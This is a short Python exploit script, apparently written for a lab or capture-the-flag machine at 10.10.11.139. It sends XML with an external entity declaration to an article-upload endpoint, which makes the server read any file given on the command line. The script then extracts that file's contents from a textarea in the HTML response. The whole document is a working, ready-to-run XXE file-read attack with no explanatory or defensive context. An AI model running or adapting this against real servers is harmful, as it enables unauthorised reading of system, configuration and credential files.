#!/usr/bin/env python3

import html
import re
import requests
import sys


def send_xml(filename):
    xml = f'''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{filename}"> ]>
<example>
  <title></title>
  <description>&xxe;</description>
  <markdown></markdown>
</example>
'''

    res = requests.post('http://10.10.11.139:5000/articles/xml', files={'file': ('test.xml', xml)})

    return res.text


def main():
    if len(sys.argv) == 1:
        print(f'Usage: python3 {sys.argv[0]} <filename>')
        exit(1)

    filename = sys.argv[1]
    xml = send_xml(filename)

    try:
        print(html.unescape(re.findall(r'<textarea.*?>(.*?)</textarea>', xml, re.DOTALL)[0]))
    except IndexError:
        print('Not Found')


if __name__ == '__main__':
    main()
